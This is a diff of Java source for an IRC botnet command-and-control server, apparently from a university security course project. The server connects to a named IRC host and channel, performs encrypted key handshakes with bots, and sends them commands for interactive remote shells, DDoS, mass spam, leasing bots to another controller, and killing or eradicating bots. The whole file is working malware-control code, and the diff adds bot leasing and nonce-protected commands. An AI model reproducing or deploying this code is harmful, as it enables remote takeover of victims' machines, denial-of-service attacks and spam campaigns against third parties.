@@ -1,16 +1,5 @@
 import java.io.*;
-import java.net.*;
-import java.security.AlgorithmParameterGenerator;
-import java.security.AlgorithmParameters;
-import java.security.Key;
-import java.security.KeyPair;
-import java.security.KeyPairGenerator;
 import java.util.*;
-
-import javax.crypto.Cipher;
-import javax.crypto.spec.DHParameterSpec;
-import javax.crypto.spec.SecretKeySpec;
-import javax.mail.*;
 import org.jibble.pircbot.*;
 
 /**
@@ -48,6 +37,10 @@ import org.jibble.pircbot.*;
  * 				the number will not be respected if it exceeds the size of the botnet.
  * 				Usage: spam numBots 'xxx' 'yyy' 'zzz' 'subject' recipient [more recipients]
  * 			</dd>
+ * 		<dt>Lease</dt>
+ * 			<dd> Allows you to lease some or all of your bots to a particular BotnetLeaseServer bot node. The duration is in milliseconds. One can specify using all the bots with 'all' or a number of bots or a list of bot nicks.
+ * 				Usage: lease leaseMaster duration bot [more bots]
+ * 			</dd>
  * 		<dt>Kill</dt>
  * 			<dd> One can specify a list of bot nicks or just say all. This command simply stops the bot process, 
  * 				but it will start again when the user restarts his/her machine.
@@ -62,23 +55,17 @@ import org.jibble.pircbot.*;
  * 
  * @author Roy McElmurry, Robert Johnson
  */
-public class BotnetServer extends PircBot {
-	private static final String[] COMMANDS = {"help", "names", "list", "shell", "ddos", "spam", "lease", "killbot", "destroybotnet"};
-	
+public class BotnetServer extends PircBot {	
 	private static final String SENTINEL = "$: ";
 	private static final String TERMINATION = "exit";
 	private static final String SERVER = "eve.cs.washington.edu";
 	private static final String CHANNEL = "#hacktastic";
 	private static final String NAME = "RandR";
-	private static final boolean DEBUG = true;
+	private static final boolean DEBUG = false;
 	private static final int PORT = 6667;
 	private static final int TIMEOUT = 120000;
 	private Scanner input;
-	private boolean inChat;
 	private Map<String, MsgEncrypt> botKeys;
-	
-	private Map<String, Long> leases;
-	private List<String> leasedBots;
 	
 	private MsgEncrypt m;
 	
@@ -86,15 +73,13 @@ public class BotnetServer extends PircBot {
 	private static final String rsaMod = "101303910710900226274349030555647780242601234001053700242140440355421711719614388158299014962476550026734960750908999517650997683806704967780217503081010517989368347136612497678731041194040683080313069165522077936751386218907487890298947166101897033800426412821219973850448264931913696365980503099134782271671";
 
 	public static void main(String[] args) {
-		BotnetServer bn = new BotnetServer();
+		new BotnetServer();
 	}
 	
 	/**
 	 * Constructs a new BotnetServer object that connects to the IRC channel and awaits commands from the user.
 	 */
 	public BotnetServer() {
-		leasedBots = new ArrayList<String>();
-		leases = new HashMap<String, Long>();
 		m = MsgEncrypt.getInstance();
 		m.genRSAPrivKey(rsaMod + " " + rsaPrivateExp);
 		input = new Scanner(System.in);
@@ -105,9 +90,7 @@ public class BotnetServer extends PircBot {
 			setName(NAME);
 			setMessageDelay(0);
 			
-			connect(SERVER, PORT);
-			
-			input = new Scanner(System.in);
+			connect(SERVER, PORT);			
 		} catch (NickAlreadyInUseException e) {
 			changeNick(NAME);
 		} catch (Exception e) {
@@ -123,11 +106,12 @@ public class BotnetServer extends PircBot {
 	protected void onUserList(String channel, User[] bots) {
 		for (int i = 0; i < bots.length; i++) {
 			if (!bots[i].getNick().equals(NAME)) {
-				System.out.print("\t" + bots[i].toString());
-				//TODO: fill in stuff with key stuff
-				//if (bots[i].getNick().startsWith("bot")) {
+				if (bots[i].getNick().startsWith("bot")) {
+					System.out.print("\t" + bots[i].toString());
 					handshake(bots[i].getNick());
-				//}
+				} else {
+					System.out.println("\t" + bots[i].toString());
+				}
 			}
 		}
 		init();
@@ -143,10 +127,12 @@ public class BotnetServer extends PircBot {
 				System.out.println("\tThe chat request was rejected.");
 			} else {
 				chat.sendLine(m.encryptRSA("key"));
-				chat.sendLine(m.encryptRSA(m2.getStrKey())); // send key
-				chat.sendLine(m.encryptRSA(info.toString())); // send public info
-				String otherKey = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n"); // get public key
-				//System.out.println("Client key for " + name + ": " + otherKey);
+				//Send Key
+				chat.sendLine(m.encryptRSA(m2.getStrKey()));
+				//Send public info
+				chat.sendLine(m.encryptRSA(info.toString()));
+				//Get public key
+				String otherKey = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n");
 				m2.handShake(otherKey);
 				botKeys.put(name, m2);
 				chat.close();
@@ -154,7 +140,6 @@ public class BotnetServer extends PircBot {
 			}
 		} catch (Exception e) {
 			System.out.println(" (insecure)");
-			e.printStackTrace();
 		}
 	}
 	
@@ -196,6 +181,18 @@ public class BotnetServer extends PircBot {
 		}
 	}
 	
+	private int getNonce(String bot) {
+		try {
+			DccChat chat = dccSendChatRequest(bot, TIMEOUT);
+			chat.sendLine("nonce");
+			int nonce = Integer.parseInt(chat.readLine());
+			chat.close();
+			return nonce;
+		} catch (Exception e) {
+			return getNonce(bot);
+		}
+	}
+	
 	/** 
 	 * <p>If s is a recognized command, the corresponding action is taken, 
 	 * otherwise if s begins with a colon it is interpreted as a private message to the channel 
@@ -208,9 +205,6 @@ public class BotnetServer extends PircBot {
 		//Respond to a help command with a shit ton of printlns.
 		if (s.toLowerCase().equalsIgnoreCase("help")) {
 			printHelp();
-		//Respond to a list command by listing all channels (DOESN'T WORK)
-		} else if (s.toLowerCase().equalsIgnoreCase("listpeeps")) {
-			listChannels();
 		//Respond to a names command by getting the user on CHANNEL and printing their nicks
 		} else if (s.toLowerCase().equals("names")) {
 			User[] bots = this.getUsers(CHANNEL);
@@ -227,18 +221,26 @@ public class BotnetServer extends PircBot {
 				String leaseMaster = parts[1];
 				long duration = Long.parseLong(parts[2]);
 				String[] bots = chooseBots(parts, 3);
-				System.out.println(Arrays.toString(parts));
 				DccChat chat = this.dccSendChatRequest(leaseMaster, TIMEOUT);
 				String botNames = bots[0];
-				for (String name : bots) {
-					botNames += " " + name;
+				for (int i = 1; i < bots.length; i++) {
+					botNames += " " + bots[i];
 				}
 				chat.sendLine(m.encryptRSA("lease " + botNames));
 				String leasedPubInfo = chat.readLine();
 				for (String name : bots) {
-					sendMessage(name, botKeys.get(name).encryptMsg(parts[0] + " " + leaseMaster + " " + duration + " " + leasedPubInfo));
-					System.out.println("\tLeased " + name + " to " + leaseMaster + " for " + duration);
+					DccChat botChat = this.dccSendChatRequest(name, TIMEOUT);
+					botChat.sendLine(botKeys.get(name).encryptMsg("leasekey", getNonce(name)));
+					botChat.sendLine(botKeys.get(name).encryptMsg(leaseMaster, getNonce(name)));
+					botChat.sendLine(botKeys.get(name).encryptMsg(duration + ""));
+					botChat.sendLine(botKeys.get(name).encryptMsg(leasedPubInfo));
+					if (!botKeys.get(name).decryptMsg(botChat.readLine()).equals("leased")) {
+						System.out.println("\tThere was an issue leasing " + name);
+					}
+					botChat.close();
 				}
+				chat.sendLine(m.encryptRSA("leased"));
+				chat.close();
 			} else {
 				System.out.println("Usage: lease leaseMaster duration bot [more bots]");
 			}
@@ -262,9 +264,7 @@ public class BotnetServer extends PircBot {
 				String command = parts[0] + " " + parts[1] + " " + parts[2] + " " + parts[3];
 				for (String name : botNames) {
 					if (!name.equals(NAME)) {
-						// TODO: encrypt command
-						//this.sendMessage(name, command);
-						this.sendMessage(name, botKeys.get(name).encryptMsg(command));
+						this.sendMessage(name, botKeys.get(name).encryptMsg(command, getNonce(name)));
 					}
 				}
 			}
@@ -305,8 +305,6 @@ public class BotnetServer extends PircBot {
 				String[] parts = list.toArray(new String[0]);
 				
 				if (parts.length < 7) {
-					System.out.println(list);
-					System.out.println(Arrays.toString(parts));
 					System.out.println("Usage: spam numBots 'xxx' 'yyy' 'zzz' subject recipient [more recipients]");
 				} else {
 					String[] bots = getUserNames();
@@ -321,9 +319,7 @@ public class BotnetServer extends PircBot {
 						command += " " + parts[i];
 					}
 					for (String name : bots) {
-						// TODO: encrypt command
-						//sendMessage(name, command);
-						sendMessage(name, botKeys.get(name).encryptMsg(command));
+						sendMessage(name, botKeys.get(name).encryptMsg(command, getNonce(name)));
 					}
 				}
 			} catch (Exception e) {
@@ -338,8 +334,7 @@ public class BotnetServer extends PircBot {
 			} else {
 				String[] bots = chooseBots(parts, 1);
 				for (String name : bots) {
-					//sendMessage(name, parts[0]);
-					sendMessage(name, botKeys.get(name).encryptMsg(parts[0]));
+					sendMessage(name, botKeys.get(name).encryptMsg(parts[0], getNonce(name)));
 				}
 			}
 		//Respond to an eradicate command by sending it along with the clean script url to each bot
@@ -351,26 +346,20 @@ public class BotnetServer extends PircBot {
 				String[] bots = chooseBots(parts, 2);
 				for (String name : bots) {
 					String command = parts[0] + " " + parts[1];
-					sendMessage(name, botKeys.get(name).encryptMsg(command));
+					sendMessage(name, botKeys.get(name).encryptMsg(command, getNonce(name)));
 				}
 			}
 		//Respond to a message beginning with a colon by messaging the CHANNEL
 		} else if (s.startsWith(":")) {
-			// TODO: encrypt s.substring
 			User[] bots = getUsers(CHANNEL);
 			for (User bot : bots) {
 				if (botKeys.containsKey(bot.getNick())) {
-					sendMessage(bot.getNick(), botKeys.get(bot.getNick()).encryptMsg(s.substring(1)));
-				} else {
-					sendMessage(bot.getNick(), s.substring(1));
+					sendMessage(bot.getNick(), botKeys.get(bot.getNick()).encryptMsg(s.substring(1), getNonce(bot.getNick())));
 				}
 			}
-			//sendMessage(CHANNEL, masterMsgE.encryptMsg(s.substring(1)));
 		//Respond to all other messages by sending the message raw to the IRC server
 		} else if (!s.isEmpty()) {
-			// TODO: encrypt s
 			sendRawLine(s);
-			//sendRawLine(masterMsgE.encryptMsg(s));
 		}
 	}
 	
@@ -462,34 +451,20 @@ public class BotnetServer extends PircBot {
 			Scanner shellout = new Scanner(chat.getBufferedReader());
 			
 			try {
-				//chat.sendLine("shell");
-				chat.sendLine(botKeys.get(botNick).encryptMsg("shell"));
-				// TODO: decrypt this
-				//System.out.print(shellout.nextLine());
+				chat.sendLine(botKeys.get(botNick).encryptMsg("shell", getNonce(botNick)));
 				System.out.print(botKeys.get(botNick).decryptMsg(shellout.nextLine()));
-				//String msg = shellout.nextLine();
-				//System.out.println(msg);
-				//System.out.println(masterMsgE.decryptMsg(msg));
-				
 				String command = input.nextLine();
 				while (!command.equalsIgnoreCase(TERMINATION)) {
-					// TODO: make this encrypted
-					chat.sendLine(botKeys.get(botNick).encryptMsg(command)); // Made this encrypted
-					//chat.sendLine(command);
-					// TODO: decrypt this
-					//String response = shellout.nextLine();
+					chat.sendLine(botKeys.get(botNick).encryptMsg(command, getNonce(botNick)));
 					String response = botKeys.get(botNick).decryptMsg(shellout.nextLine());
 					while (!response.endsWith(SENTINEL)) {
 						System.out.println("\t" + response);
-						// TODO: decrypt this
-						//response = shellout.nextLine();
 						response = botKeys.get(botNick).decryptMsg(shellout.nextLine());
 					}
 					System.out.print(response);
 					command = input.nextLine();
 				}
-				//chat.sendLine(command);
-				chat.sendLine(botKeys.get(botNick).encryptMsg(command));
+				chat.sendLine(botKeys.get(botNick).encryptMsg(command, getNonce(botNick)));
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
